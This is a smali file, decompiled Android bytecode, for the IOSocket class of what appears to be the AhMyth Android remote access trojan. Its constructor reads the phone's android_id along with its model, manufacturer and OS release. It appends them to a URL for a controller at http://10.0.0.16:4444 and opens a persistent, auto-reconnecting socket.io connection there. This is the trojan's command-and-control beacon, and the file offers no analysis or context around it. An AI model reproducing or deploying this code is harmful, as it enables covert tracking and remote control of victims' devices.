.class public Lahmyth/mine/king/ahmyth/IOSocket;
.super Ljava/lang/Object;
.source "IOSocket.java"


# static fields
.field private static ourInstance:Lahmyth/mine/king/ahmyth/IOSocket;


# instance fields
.field private ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 14
    new-instance v0, Lahmyth/mine/king/ahmyth/IOSocket;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/IOSocket;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->ourInstance:Lahmyth/mine/king/ahmyth/IOSocket;

    return-void
.end method

.method private constructor <init>()V
    .locals 4

    .line 19
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 22
    :try_start_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "android_id"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 23
    .local v0, "deviceID":Ljava/lang/String;
    new-instance v1, Lio/socket/client/IO$Options;

    invoke-direct {v1}, Lio/socket/client/IO$Options;-><init>()V

    .line 24
    .local v1, "opts":Lio/socket/client/IO$Options;
    const/4 v2, 0x1

    iput-boolean v2, v1, Lio/socket/client/IO$Options;->reconnection:Z

    .line 25
    const-wide/16 v2, 0x1388

    iput-wide v2, v1, Lio/socket/client/IO$Options;->reconnectionDelay:J

    .line 26
    const-wide/32 v2, 0x3b9ac9ff

    iput-wide v2, v1, Lio/socket/client/IO$Options;->reconnectionDelayMax:J

    .line 28
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "http://10.0.0.16:4444?model="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-static {v3}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&manf="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&release="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&id="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lio/socket/client/IO;->socket(Ljava/lang/String;)Lio/socket/client/Socket;

    move-result-object v2

    iput-object v2, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    .line 31
    .end local v0    # "deviceID":Ljava/lang/String;
    .end local v1    # "opts":Lio/socket/client/IO$Options;
    goto :goto_0

    .line 29
    :catch_0
    move-exception v0

    .line 30
    .local v0, "e":Ljava/net/URISyntaxException;
    invoke-virtual {v0}, Ljava/net/URISyntaxException;->printStackTrace()V

    .line 32
    .end local v0    # "e":Ljava/net/URISyntaxException;
    :goto_0
    return-void
.end method

.method public static getInstance()Lahmyth/mine/king/ahmyth/IOSocket;
    .locals 1

    .line 36
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->ourInstance:Lahmyth/mine/king/ahmyth/IOSocket;

    return-object v0
.end method


# virtual methods
.method public getIoSocket()Lio/socket/client/Socket;
    .locals 1

    .line 40
    iget-object v0, p0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method
